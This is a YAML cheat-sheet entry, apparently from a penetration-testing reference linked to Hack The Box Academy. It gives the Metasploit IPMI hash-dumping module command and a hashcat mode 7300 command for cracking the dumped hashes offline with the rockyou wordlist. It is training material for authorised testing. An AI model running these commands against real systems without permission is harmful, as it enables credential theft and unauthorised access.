---
description: |
  Use the Metasploit IPMI hash dumping module to retrieve authentication hashes from the target IPMI service. 
  This module is useful for gathering hash data, which can then be used for offline password cracking with tools such as hashcat.
  
  Command Reference:
  
      Target IP: 10.10.10.1

command: |
  msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes

code: |
  hashcat -m 7300 --username hash ~/Downloads/rockyou.txt

items:
  - No_Creds
  - Hash
services:
  - IPMI
OS:
  - Linux
  - Mac
attack_types:
  - Enumeration
references:
  - https://academy.hackthebox.com/module/112/section/2117
---
